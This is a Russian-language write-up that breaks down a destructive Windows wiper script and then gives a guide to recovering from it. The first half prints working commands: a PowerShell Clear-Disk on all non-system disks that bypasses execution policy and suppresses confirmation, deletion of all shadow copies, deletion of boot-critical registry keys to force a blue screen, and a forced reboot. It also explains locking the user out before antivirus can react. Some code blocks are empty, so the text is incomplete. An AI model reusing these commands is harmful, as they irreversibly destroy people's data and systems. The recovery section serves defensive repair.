## <a name="theorem"></a> 4) 📚 Теоретическая часть
В этом разделе разобраны концепции, на которых базируется работа скрипта. Понимание этих механизмов необходимо для осознанного построения защиты.
### 1. Доверие к администратору (UAC Token)
В архитектуре Windows права администратора являются «абсолютными».
Теория: Когда пользователь подтверждает запрос UAC (User Account Control), процесс получает токен, который позволяет ему взаимодействовать с критическими системными утилитами (diskpart, vssadmin, reg).
Проблема: Система безопасности Windows спроектирована так, что она доверяет действиям администратора. Если админ приказал удалить диск — система считает это легитимным действием.
### 2. Уровни владения данными (TrustedInstaller vs Admin)
Многие ошибочно думают, что администратор может всё. На самом деле:
Файлы в System32 защищены владельцем TrustedInstaller.
Но: Реестр (ветка SYSTEM) и таблица разделов диска защищены слабее. Администратор имеет достаточно прав, чтобы «отпилить сук, на котором сидит система», не затрагивая защищенные файлы напрямую.
### 3. Механизм блокировки файлов (File Locking)
Windows запрещает удалять файлы, которые запущены в данный момент.
Обход: Скрипт не пытается удалить запущенные файлы. Вместо этого он уничтожает структуру, которая ими управляет (реестр и таблицу разделов). Это позволяет «убить» систему, пока она еще работает, так как критические данные уже загружены в оперативную память.
### 4. Особенности накопителей (HDD vs SSD TRIM)
Критическое различие в физике хранения данных:
HDD: Команда clean стирает только заголовки. Данные остаются на пластинах физически.
SSD: После удаления раздела система может отправить команду TRIM. Это заставляет контроллер SSD физически очистить ячейки памяти в фоновом режиме. Это делает восстановление невозможным даже с помощью профессионального ПО.

### 2. PowerShell
Этот фрагмент отвечает за то, чтобы Windows позволила выполнить команды PowerShell, даже если в системе установлены строгие настройки безопасности.
###### python
        # 2. PowerShell: добавляем Bypass
        # Без этого политика Restricted заблокирует очистку дисков
        ps_wipe = (
            'powershell -ExecutionPolicy Bypass -Command "'
            'Get-Disk | Where-Object {$_.Number -ne 0} | '
            'Clear-Disk -RemoveData -RemoveOEM -Confirm:$false -ErrorAction SilentlyContinue"'
        )
1. Bypass обходит запрет на скрипты.
2. Where-Object обходит системный диск.
3. Confirm:$false обходит ручное подтверждение.
4. SilentlyContinue обходит ошибки (например, если диск занят).

Этот блок — тактический маневр. Его цель — лишить пользователя доступа и «отрезать пути к отступлению» максимально быстро, пока антивирус или сам пользователь не успели среагировать на более тяжелые операции (вроде затирания дисков).
###### python

##### 1. Молниеносная смена пароля
Зачем это здесь: Если пользователь заметит подозрительную активность (например, всплывающие окна консоли) и попытается нажать Win+L (заблокировать компьютер) или перезагрузиться, он уже не сможет войти обратно. Старый пароль перестанет работать в ту же секунду, как выполнится эта строка.
##### 2. Отключение «реанимации» (WinRE)
Зачем это здесь: Это подготовка к пункту 6 (где удаляются драйверы). Когда после перезагрузки Windows выдаст «синий экран» (BSOD), она обычно предлагает зайти в меню восстановления. Но благодаря этой строке, пользователь увидит только мертвый экран с кодом ошибки.

Используйте код с осторожностью.

### 4. Сжигание VSS и теневых копий

###### python

##### Разбор параметров:
1. vssadmin: Системная утилита для управления теневым копированием.
2. delete shadows: Команда на физическое удаление файлов снимков с диска.
3. /all: Удалить абсолютно все точки восстановления на всех разделах (C:, D: и т.д.).
4. /quiet: «Тихий» режим. Обычно Windows спрашивает: «Вы действительно хотите удалить все копии? Это нельзя отменить». Флаг /quiet автоматически отвечает «Да» за пользователя.
### 5. Стирание разметок дисков
Тут запуск PowerShell, который ммы разобрали еще во втором пункте
###### python
            # 5. Стираем внешние диски
            subprocess.run(ps_wipe, shell=True)
команда subprocess.run(..., shell=True) создает «мостик» в командную строку Windows (cmd.exe), которая, в свою очередь, вызывает powershell.exe. Это необходимо, так как Python сам по себе не имеет встроенных функций для низкоуровневой очистки дисков — он полагается на системные инструменты.
1. Скрипт просто «зависнет» на несколько секунд (или минут, если диски огромные).
2. В это время в фоне PowerShell будет последовательно уничтожать разделы на каждом найденном диске.
3. Пользователь не увидит никаких всплывающих окон или вопросов «Вы уверены?».

### 6. Удаление важных реестров
Это финальный, «смертельный» удар по операционной системе. Если предыдущие шаги уничтожали данные пользователя, то этот уничтожает способность Windows загрузиться.
###### python
            # 6. Реестр с обходом архитектуры
            # Ветку SYSTEM удалить целиком сложно из-за TrustedInstaller,
            # поэтому бьем по "жизненно важным органам" (драйверам), которые админу доступны
            subprocess.run("reg delete HKLM\\SYSTEM\\Select /f /reg:64", shell=True)
            subprocess.run("reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\storahci /f /reg:64", shell=True)
1. Зачем нужен флаг /reg:64?
Параметр /reg:64 заставляет команду игнорировать архитектуру и бить прямо в основное хранилище настроек системы.
2. Удаление HKLM\SYSTEM\Select
Эта ветка — «дорожная карта» загрузки. В ней хранятся параметры:
    Current: какой набор настроек (ControlSet001, 002) использовать сейчас.
    Default: что грузить по умолчанию.
3. Удаление HKLM\SYSTEM\CurrentControlSet\Services\storahci
Это самый изощренный удар. storahci — это стандартный драйвер для контроллеров SATA/AHCI.
4. Почему не удалить всю ветку SYSTEM?
Как замечено в комментарии к коду, многие ключевые ветки реестра защищены правами TrustedInstaller. Даже администратор не может их просто так удалить.
Результат: BSOD (Синий экран смерти) с кодом INACCESSIBLE_BOOT_DEVICE. Поскольку мы уже отключили среду восстановления в пункте 3, система даже не попытается исправить эту ошибку.
### 7. Финал: Перезагрузка или Выключение
Код в блоке try...except гарантирует, что компьютер будет выключен в любом случае, даже если возникнет ошибка при попытке перезагрузки. 
###### python
            # 7. Финал
            os.system("shutdown /r /f /t 0")
        except:
            os.system("shutdown /s /f /t 0")
    
    if __name__ == "__main__":
        if ctypes.windll.shell32.IsUserAnAdmin():
            #ultimate_payload() # Вызов закомментирован для безопасности
        else:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
##### shutdown /r /f /t 0 (в блоке try):
/r: Команда на перезагрузку (reboot). Это критический момент: именно при загрузке система столкнется с удаленными драйверами и поврежденным реестром из пункта 6, что приведет к «синему экрану» (BSOD).
/f: Принудительное (force) закрытие всех запущенных приложений без предупреждения и сохранения данных.
/t 0: Установка таймера на 0 секунд — действие происходит мгновенно.
##### shutdown /s /f /t 0 (в блоке except):
Если скрипт по какой-то причине выдал ошибку, выполняется выключение (shutdown). Результат будет в завмости от того, на каком этапе произошла ошибка

## <a name="recovery"></a> 6) 🚑 Восстановление
Я объясню, почему восстановиться будет максимально сложно. Скрипт удаляет точки восстановления, выключает автоматическую "чинилку" windows, которая может даже очень неплохо чинить, если пользователь не запустился в ПК 3 раза. Он лезет в реестр и точно бьет "по коленям" windows, чтобы ходить она больше не смогла.

### 1): Восстановление дисков (Битва с Clear-Disk)
Этот этап — фундамент. Пока мы не вернем разделы, реестр чинить негде.

#### 1.1. Анализ катастрофы через Diskpart
Загрузившись с LiveCD, первым делом открываем консоль и проверяем масштаб разрушений:

    diskpart
    list disk
    select disk 0 (твой основной диск)
    list partition
Если ты видишь надпись «Разделы отсутствуют» или диск помечен как MSR (служебный), значит, Clear-Disk сработал. Выходим из diskpart командой exit.

#### 1.2. Работа с TestDisk (Пошагово)
TestDisk — это «чернокнижник» в мире восстановления. У него нет красивых окон, только текст, но он видит структуру диска сквозь пустоту.
Запуск: Выбираешь свой диск из списка. Обычно он называется по модели (например, Samsung SSD...).

Partition Table Type: Если комп современный (UEFI), выбирай [EFI GPT]. Если старый — [Intel].

Analyse -> Quick Search: Программа начнет сканировать диск. Она ищет сигнатуры NTFS.

Результат поиска: Ты увидишь список найденных разделов.
Как понять, что это они? Смотри на размер. Раздел на 100-300 Мб — это загрузчик. Раздел на 100+ Гб — это твоя система.

Проверка файлов: Нажми клавишу P на найденном разделе. Если ты видишь свои папки (Users, Windows), значит, раздел «живой»! Нажми Q, чтобы выйти из предпросмотра.

Запись: Если всё верно, жми Enter, затем выбери пункт [Write] и подтверди клавишей Y.

Финал: Программа попросит перезагрузку. Важно: Перезагрузись снова в LiveCD. Теперь диск должен появиться в системе под своей буквой (например, D:).

#### 1.3. Почему SSD — это лотерея (TRIM)
Когда ты удаляешь раздел на HDD, данные просто лежат там, пока их не перезапишут. На SSD работает функция TRIM.

Как только Clear-Disk говорит системе «этого раздела больше нет», контроллер SSD может решить, что эти ячейки памяти ему больше не нужны, и начнет их физически очищать в фоновом режиме, чтобы ускорить будущую запись.

Твой шанс: Если ты выключил ПК сразу после запуска скрипта, TRIM не успел «съесть» данные.

Признак смерти: Если TestDisk находит раздел, но при нажатии P ты видишь пустоту или ошибку — значит, TRIM уже отработал.

#### 1.4. Проверка файловой системы
После того как TestDisk вернул разделы, их нужно проверить на ошибки, так как скрипт прервал работу системы «на лету»:

    chkdsk D: /f
(где D: — буква восстановившегося диска). Только после этого можно переходить к починке реестра и загрузчика.

### 2) Восстановление загрузчика (Bootloader)
Даже когда файлы на месте, компьютер при включении выдаст ошибку «Insert proper boot device». Это происходит потому, что Clear-Disk удалил скрытый технический раздел, на котором лежит «карта запуска» Windows.

Для современных систем (UEFI/GPT):

В консоли LiveCD введи diskpart.

Тебе нужно создать новый загрузочный раздел (если старый не удалось вернуть через TestDisk):

    select disk 0 (твой диск)
    create partition efi size=100
    format quick fs=fat32 label="System"
    assign letter=Z
    exit
Теперь «прописываем» Windows в этот новый раздел:

    bcdboot C:\Windows /s Z: /f UEFI
Эта команда берет файлы загрузки из твоей папки Windows и копирует их в технический раздел Z, делая диск снова загрузочным.
Для старых систем (Legacy/MBR):

Тут всё проще, достаточно трех команд подряд:

    bootrec /fixmbr
    bootrec /fixboot
    bootrec /rebuildbcd

### 3) Сброс «замков» (Пароль и WinRE)
Это финальный штрих. Скрипт не просто сломал загрузку, он сменил пароль пользователя и отключил аварийное меню Windows (WinRE), чтобы ты не мог нажать кнопку «Восстановить».

#### 3.1. Включаем «самолечение» Windows:

В консоли введи:

        bcdedit /set {default} recoveryenabled Yes
Теперь, если что-то пойдет не так, при загрузке снова появится меню выбора вариантов восстановления.

#### 3.2. Разбираемся с паролем Pa$$w0rd123:
Поскольку скрипт успешно сменил твой пароль через net user, у тебя есть два пути после того, как система загрузится:

Путь А: Просто войти с паролем Pa$$w0rd123 и сменить его в настройках.

Путь Б (если пароль не подходит): Использовать утилиту на LiveCD (например, reanimator live CD), которая позволяет просто стереть пароль любого пользователя в файле SAM, пока система «спит».

### 4) Восстановление реестра и драйверов
Когда скрипт удаляет ветку HKLM\SYSTEM\CurrentControlSet\Services\storahci, он фактически стирает инструкцию, как общаться с жестким диском. Результат — синий экран (BSOD) с ошибкой INACCESSIBLE_BOOT_DEVICE.

#### 4.1. Вход в консоль через Live USB
Поскольку система не грузится, нам нужна «внешняя операционная система».
Вставьте загрузочную флешку Windows.
На этапе выбора языка нажмите Shift + F10. Появится черное окно командной строки.
Важный шаг: В Live-режиме буквы дисков меняются. Ваша Windows может быть на диске D: или E:. Проверьте это командой:
dir D: или dir E:. Ищите ту букву, где увидите папку Windows. Допустим, это диск C:.

#### 4.2. Метод «RegBack» (Если повезет)
Раньше Windows сама делала бэкап реестра каждые 10 дней. В новых версиях (после 2018 года) это отключено, но проверить стоит — это самый быстрый способ.

Введите команду: dir C:\Windows\System32\config\RegBack

Если файлы (SYSTEM, SOFTWARE, SAM) имеют размер больше 0 КБ, вам повезло. 
Копируем их в рабочую папку:

    copy C:\Windows\System32\config\RegBack\* C:\Windows\System32\config\
На вопросы о замене отвечайте Yes. Это откатит состояние реестра до момента, когда скрипт еще не был запущен.

#### 4.3. Метод «DISM» (Восстановление через хранилище компонентов)
Если бэкапа нет, нужно заставить Windows переустановить удаленные драйверы и ветки реестра из внутреннего защищенного архива.
Введите команду:

    dism /Image:C:\ /Cleanup-Image /RestoreHealth
Здесь C:\ — это буква вашего системного диска.

Что происходит: DISM видит, что в реестре не хватает критических записей (например, того самого storahci), находит их копии в папке WinSxS и прописывает обратно. Это «лечит» систему без потери ваших программ.

#### 4.4. Метод «Load Hive» (Ручная хирургия реестра)
Если DISM не справился, можно вручную импортировать нужную ветку реестра с другого рабочего ПК.

На рабочем ПК экспортируйте ветку HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\storahci в файл fix.reg.

На зараженном ПК в консоли Live USB введите regedit.

Выберите HKEY_LOCAL_MACHINE, затем Файл -> Загрузить куст.

Выберите файл C:\Windows\System32\config\SYSTEM. Дайте ему имя TEMP_SYS.

Теперь вы можете зайти в TEMP_SYS\ControlSet001\Services и вручную создать удаленные ключи или импортировать их из файла fix.reg (предварительно подправив в нем пути на TEMP_SYS).

После этого обязательно выделите TEMP_SYS и выберите Файл -> Выгрузить куст.

#### 4.5. Проверка целостности (SFC)
Финальный штрих, чтобы убедиться, что другие системные файлы не пострадали:

    sfc /scannow /offbootdir=C:\ /offwindir=C:\Windows    
Это проверит все файлы Windows на соответствие оригиналам и исправит их, если скрипт успел что-то зацепить в папке System32.

Итог этапа: Если все сделано правильно, после перезагрузки Windows снова «увидит» контроллер диска и начнет загружаться.

Итог: Что мы имеем в конце?

Если ты прошел через все пункты:

Восстановил разделы (вернул файлы из небытия).

Починил реестр (научил Windows снова видеть диски).

Прописал загрузчик (объяснил компьютеру, как включаться).

Сбросил пароль (вернул себе доступ).

Важное завершение:
После такой «терапии» система — это «Франкенштейн». Она будет работать, но возможны глюки. Самый правильный путь: как только зашли в систему — копируйте всё важное на флешку и делайте чистую переустановку.
